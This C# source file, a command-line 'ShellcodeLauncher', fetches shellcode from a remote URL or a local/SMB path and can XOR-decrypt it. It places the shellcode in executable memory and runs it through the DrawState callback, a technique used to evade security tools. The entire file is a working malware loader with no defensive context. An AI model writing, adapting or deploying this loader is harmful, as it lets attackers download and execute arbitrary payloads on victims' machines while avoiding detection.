using System;
using System.Runtime.InteropServices;
using System.IO;
using System.Net.Http;

class Program
{
    [DllImport("user32.dll")]
    public static extern int DrawState(IntPtr hdc, IntPtr hBrush, IntPtr lpOutputFunc, IntPtr lParam, IntPtr wParam, int nXLeft, int nYTop, int nWidth, int nHeight, uint fuFlags);

    [DllImport("user32.dll")]
    public static extern IntPtr GetDC(IntPtr hWnd);

    [DllImport("user32.dll")]
    public static extern int ReleaseDC(IntPtr hWnd, IntPtr hDC);

    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    private static extern bool VirtualFree(IntPtr lpAddress, uint dwSize, uint dwFreeType);

    private const uint MEM_COMMIT = 0x00001000;
    private const uint MEM_RESERVE = 0x00002000;
    private const uint PAGE_EXECUTE_READWRITE = 0x40;
    private const uint MEM_RELEASE = 0x8000;
    private const uint DSS_MONO = 0x8;

    static void Main(string[] args)
    {
        if (args.Length < 1)
        {
            Console.WriteLine("Usage: ShellcodeLauncher.exe [-r remote_url | local_path_or_SMB_path] [-k xor_key]");
            return;
        }

        string sourcePath = args[1];
        string xorKey = null;

        if (args.Length == 4 && args[2] == "-k")
        {
            xorKey = args[3];
        }

        byte[] shellcode;

        if (args[0] == "-r")
        {
            shellcode = DownloadShellcodeFromUrl(sourcePath);
        }
        else
        {
            shellcode = File.ReadAllBytes(sourcePath);
        }

        if (!string.IsNullOrEmpty(xorKey))
        {
            shellcode = DecryptShellcode(shellcode, xorKey);
        }

        if (shellcode == null || shellcode.Length == 0)
        {
            Console.WriteLine("[Failed] Failed to load or decrypt shellcode.");
            return;
        }

        IntPtr hAlloc = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (hAlloc == IntPtr.Zero)
        {
            Console.WriteLine($"[Failed] Memory allocation for shellcode failed. Error Code: {Marshal.GetLastWin32Error()}");
            return;
        }
        else
        {
            Console.WriteLine($"[Success] Memory allocation for shellcode was successful at address: {hAlloc}");
        }

        Marshal.Copy(shellcode, 0, hAlloc, shellcode.Length);
        IntPtr hDC = GetDC(IntPtr.Zero);
        if (hDC == IntPtr.Zero)
        {
            Console.WriteLine($"[Failed] GetDC failed. Error Code: {Marshal.GetLastWin32Error()}");
            return;
        }

        int result = DrawState(hDC, IntPtr.Zero, hAlloc, IntPtr.Zero, IntPtr.Zero, 0, 0, 1, 1, DSS_MONO);
        if (result == 0)
        {
            Console.WriteLine($"[Failed] DrawState failed. Error Code: {Marshal.GetLastWin32Error()}");
            return;
        }
        else
        {
            Console.WriteLine("[Success] Invoking DrawState...");
        }

        ReleaseDC(IntPtr.Zero, hDC);
        VirtualFree(hAlloc, 0, MEM_RELEASE);
    }

    static byte[] DownloadShellcodeFromUrl(string url)
    {
        using (var httpClient = new HttpClient())
        {
            try
            {
                var byteArray = httpClient.GetByteArrayAsync(url).Result;
                if (byteArray != null && byteArray.Length > 0)
                {
                    Console.WriteLine("[Success] Shellcode downloaded successfully.");
                    return byteArray;
                }
                else
                {
                    Console.WriteLine("[Failed] Shellcode downloaded but the content is empty or null.");
                    return null;
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[Failed] Downloading shellcode: {ex.Message}");
                return null;
            }
        }
    }

    static byte[] DecryptShellcode(byte[] encryptedShellcode, string xorKey)
    {
        byte[] decryptedShellcode = new byte[encryptedShellcode.Length];
        for (int i = 0; i < encryptedShellcode.Length; i++)
        {
            decryptedShellcode[i] = (byte)(encryptedShellcode[i] ^ xorKey[i % xorKey.Length]);
        }
        return decryptedShellcode;
    }
}
